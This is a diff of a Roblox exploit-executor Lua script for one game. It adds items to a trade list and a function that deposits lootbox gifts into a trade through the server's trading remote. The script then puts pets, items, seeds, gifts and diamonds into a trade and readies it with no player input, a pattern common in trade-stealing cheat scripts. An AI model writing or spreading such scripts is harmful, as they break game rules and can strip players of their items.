@@ -7,7 +7,7 @@ if game.PlaceId == 8737899170 then
         {Pet = "Police Dog", Patern = 2, DecrementBy = 28},
         {Pet = "Prison Cow", Patern = all},
         {Pet = "Prison Axolotl", Patern = 2, DecrementBy = 100},
-        {Pet = "Detectile Cat", Patern = all}]]
+        {Pet = "Detective Cat", Patern = all}]]
 
     }
     getgenv().ItemToTrade = {
@@ -33,7 +33,9 @@ if game.PlaceId == 8737899170 then
         "Diamond",
         "Insta Plant Capsule",
         "Seed Bag",
-        "Arcade Token"
+        "Arcade Token",
+        "Hype Egg",
+        "Global Event Gift"
 }
 
     local library = require(game.ReplicatedStorage.Library)
@@ -180,6 +182,25 @@ if game.PlaceId == 8737899170 then
         end
     end
 
+    local function DepositGiftInTrade()
+        for i,v in pairs(inventory.Lootbox) do
+            if v._am ~= nil then
+                for _, itemName in pairs(getgenv().ItemToTrade) do
+                    if v.id == itemName then
+                        wait(0.1)
+                        local args = {
+                            [1] = GetTradeID(),
+                            [2] = "Lootbox",
+                            [3] = i,
+                            [4] = v._am
+                        }
+                        game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Server: Trading: Set Item"):InvokeServer(unpack(args))
+                    end
+                end
+            end
+        end
+    end
+
     local function DepositDiamondsInTrade()
         for i,v in pairs(save.Inventory.Currency) do
             if v.id == 'Diamonds' then
@@ -207,6 +228,7 @@ if game.PlaceId == 8737899170 then
             DepositStatPetInTrade()
             DepositItemInTrade()
             DepositSeedInTrade()
+            DepositGiftInTrade()
             DepositDiamondsInTrade()
             ReadyTrade()
             wait(3)
